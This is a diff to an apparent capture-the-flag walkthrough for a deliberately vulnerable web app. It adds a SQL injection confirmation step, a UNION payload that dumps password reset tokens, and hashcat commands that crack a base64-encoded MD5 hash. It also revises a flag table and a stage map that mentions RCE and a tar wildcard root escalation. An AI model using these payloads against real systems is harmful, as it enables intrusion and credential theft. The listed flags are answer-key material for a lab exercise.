@@ -94,7 +94,25 @@ Navigate to `/search/`. The search handler runs two queries: a normal full-text 
 sql = f"SELECT id, username, api_token FROM users WHERE api_token = '{query}'"
 ```
 
-Inject a UNION payload to dump the `password_resets` table:
+### Confirming the injection point
+
+Before crafting UNION payloads, confirm the injection by entering a single quote `'` in the search box:
+
+```
+http://<ip>:8080/search/?q='
+```
+
+The page fires a JavaScript `alert()` and renders an inline debug banner:
+
+```
+[DEBUG] Internal error in token subsystem:
+Query: SELECT id, username, api_token FROM users WHERE api_token = '''
+Error: near "'": syntax error
+```
+
+This reveals the full query structure, confirms string-based injection after `api_token = '`, and shows all 3 column names needed for a UNION attack.
+
+### Inject a UNION payload to dump the `password_resets` table:
 
 ```
 http://<ip>:8080/search/?q=' UNION SELECT id,user_id,token FROM password_resets --
@@ -386,47 +404,45 @@ Result:
 
 | username | legacy_password_hash |
 |---|---|
-| chatbot | `114e1b961ff13e07a100f726752a17de` |
-| sarah_chen | `e725427d7cda37d87220232a19c05e9b` |
-| manager_bob | `fb2e43dfd14a4838f3f3126f657cc59a` |
-| compliancebot | `ff0d1180e3fcfb7598d3211a91625630` |
+| chatbot | `QZ8CEw7b24IwMNeE5RFdfA==` |
+| sarah_chen | `6CPT/2IqwIs/EUQw68KdIw==` |
+| manager_bob | `eLuHkGGwhLLDfQx7NXiDNw==` |
+| compliancebot | `axiZUD8XHIwuAnDt4tidow==` |
 
-All 32-character hex strings — MD5 hashes.
+All 24-character base64 strings ending in `==` — the base64 encoding of 16 raw bytes, i.e. the MD5 digest.
 
 ### Understand the scheme
 
-The database schema and the hint in the challenge description point to a two-step hash:
+The two-step scheme is `base64(MD5(plaintext))`:
 
 ```python
 # database.py — legacy hash function
 import hashlib, base64
 
 def _legacy_hash(password):
-    b64 = base64.b64encode(password.encode()).decode()
-    return hashlib.md5(b64.encode()).hexdigest()
+    md5_bytes = hashlib.md5(password.encode()).digest()  # raw bytes
+    return base64.b64encode(md5_bytes).decode()
 ```
-
-`MD5(base64(plaintext))`.
 
 ### Crack compliancebot's hash
 
-For normal accounts the plaintext is the user's regular password. `compliancebot` is the bot account and its legacy plaintext is the flag itself.
+For normal accounts the plaintext is the user's regular password. `compliancebot`'s legacy plaintext is the flag — a dictionary word.
 
-Verify:
+Step 1 — decode base64 to get the raw MD5 hex:
 
-```python
-import hashlib, base64
-
-def legacy_hash(p):
-    return hashlib.md5(base64.b64encode(p.encode())).hexdigest()
-
-assert legacy_hash("CTF{md5_b64_l3g4cy_p4ss_cr4ck3d}") == "ff0d1180e3fcfb7598d3211a91625630"
-# True
+```bash
+python3 -c "import base64; print(base64.b64decode('axiZUD8XHIwuAnDt4tidow==').hex())"
+# 6b1899503f171c8c2e0270ede2d89da3
 ```
 
-To crack without prior knowledge: run hashcat in mode 0 (straight MD5) against a wordlist, or use a rule/script that applies `base64(candidate)` before hashing. The CTF flag format `CTF{...}` narrows the search space significantly.
+Step 2 — crack the MD5 hex with hashcat mode 0 and RockYou:
 
-**Flag: `CTF{md5_b64_l3g4cy_p4ss_cr4ck3d}`**
+```bash
+hashcat -m 0 6b1899503f171c8c2e0270ede2d89da3 /usr/share/wordlists/rockyou.txt
+# 6b1899503f171c8c2e0270ede2d89da3:ufoundit
+```
+
+**Flag: `ufoundit`**
 
 ---
 
@@ -508,8 +524,8 @@ Register account (role: new_user)
  │            CTF{r3v_3ng_b4ackd00r_4cc3ss!}
  │
  ├─► Stage 4: RCE dumps SQLite → legacy_password_hash for compliancebot
- │            → MD5(base64(x)) == hash → x = flag
- │            CTF{md5_b64_l3g4cy_p4ss_cr4ck3d}
+ │            → base64-decode hash → MD5 hex → crack with RockYou
+ │            ufoundit
  │
  └─► Stage 5: world-writable /data/uploads + cron tar * wildcard
               → checkpoint filename injection → root shell
@@ -527,7 +543,7 @@ Register account (role: new_user)
 | Forgotten History | Web / Recon | `CTF{exposed_git_repository_secret}` |
 | Stolen Identity | Web / Auth | `CTF{idor_token_auth_bypass_privesc_complete}` |
 | Backdoor Access | Reversing | `CTF{r3v_3ng_b4ackd00r_4cc3ss!}` |
-| Legacy Secrets | Crypto | `CTF{md5_b64_l3g4cy_p4ss_cr4ck3d}` |
+| Legacy Secrets | Crypto | `ufoundit` |
 | Root or Die | Privesc | `CTF{w1ldcard_t4r_g0t_r00t!}` |
 
 ### Key accounts
